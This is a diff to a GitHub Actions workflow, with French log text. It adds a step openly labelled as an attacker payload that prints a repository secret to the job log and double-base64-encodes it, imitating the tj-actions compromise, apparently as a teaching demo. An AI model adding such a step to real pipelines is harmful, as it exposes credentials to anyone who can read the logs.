@@ -12,6 +12,22 @@ jobs:
           echo "----- Début du log légitime -----"
           echo "La valeur du secret est : $DEMO_SECRET"
           echo "----- Fin du log légitime -----"
-env:
+          env:
           DEMO_SECRET: ${{ secrets.DEMO_SECRET1 }}
-     
+      - name: 🚨 Étape compromise 
+        run: |
+          echo ""
+          echo "===== ⚠️ ATTACKER PAYLOAD ACTIVÉ ====="
+          echo "[Attacker] Lecture de la variable d'environnement..."
+          echo "[Attacker] Secret exfiltré en clair : $DEMO_SECRET"
+          echo ""
+          echo "[Attacker] Double encodage Base64 (comme l'attaque tj-actions) :"
+          encoded=$(echo -n "$DEMO_SECRET" | base64 | base64)
+          echo "$encoded"
+
+          echo ""
+          echo "[Attacker] Décodage pour récupérer le secret réel :"
+          echo "$encoded" | base64 -d | base64 -d
+          echo "===== ⚠️ FIN DU PAYLOAD ====="
+        env:
+          DEMO_SECRET: ${{ secrets.DEMO_SECRET }}
